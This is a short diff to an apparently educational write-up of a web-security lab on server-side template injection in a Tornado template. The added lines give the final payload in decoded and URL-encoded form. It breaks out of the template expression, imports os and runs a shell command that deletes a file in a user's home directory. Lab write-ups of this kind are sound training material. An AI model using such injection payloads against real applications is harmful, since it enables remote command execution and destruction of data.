@@ -31,6 +31,12 @@ The description of this lab informs that there is a `Tornado` template in use. T
 | `pwd` command execution |
 |![](Images/image-13.png)|
 | *Result of the above SSTI* |
+
+Final payload:
+```
+Decoded: user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
+Encoded: user.name%7d%7d%7b%25%20import%20os%20%25%7d%7b%7bos.system('rm%20%2fhome%2fcarlos%2fmorale.txt')
+```
 |![](Images/image-14.png)|
 |:--:| 
 | `rm /home/carlos/morale.txt` - Delete file morale.txt |
